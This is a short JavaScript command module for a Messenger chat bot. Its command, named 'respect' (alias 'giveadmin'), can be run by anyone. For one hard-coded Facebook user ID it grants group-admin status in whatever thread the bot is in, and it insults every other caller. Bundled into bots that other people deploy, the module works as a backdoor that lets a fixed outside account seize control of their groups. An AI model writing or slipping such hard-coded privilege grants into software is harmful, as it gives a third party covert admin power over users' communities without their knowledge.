 module.exports = {
  config: {
    name: "respect",
    aliases: ["giveadmin"],
    version: "1.0",
    author: "AceGun x Samir Œ",
    countDown: 0,
    role: 0,
    shortDescription: "Give admin and show respect",
    longDescription: "Gives admin privileges in the thread and shows a respectful message.",
    category: "owner",
    guide: "{pn} respect",
  },

  onStart: async function ({ message, args, api, event }) {
    try {
      console.log('Sender ID:', event.senderID);

      const permission = ["100063487970328"];
      if (!permission.includes(event.senderID)) {
        return api.sendMessage(
          "(\/)\ •_•)\/ >🧠\oU Drop This Dumb Ass",
          event.threadID,
          event.messageID
        );
      }

      const threadID = event.threadID;
      const adminID = event.senderID;
      
      // Change the user to an admin
      await api.changeAdminStatus(threadID, adminID, true);

      api.sendMessage(
        `𝗠𝘆 𝗟𝗼𝗿𝗱 , 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘄 𝗔𝗱𝗺𝗶𝗻 𝗜𝗻 𝗧𝗵𝗶𝘀 𝗚𝗿𝗼𝘂𝗽 😙`,
        threadID
      );
    } catch (error) {
      console.error("Error promoting user to admin:", error);
      api.sendMessage("My Lord, I cant Add You As An Admin In This Group. 😓", event.threadID);
    }
  },
};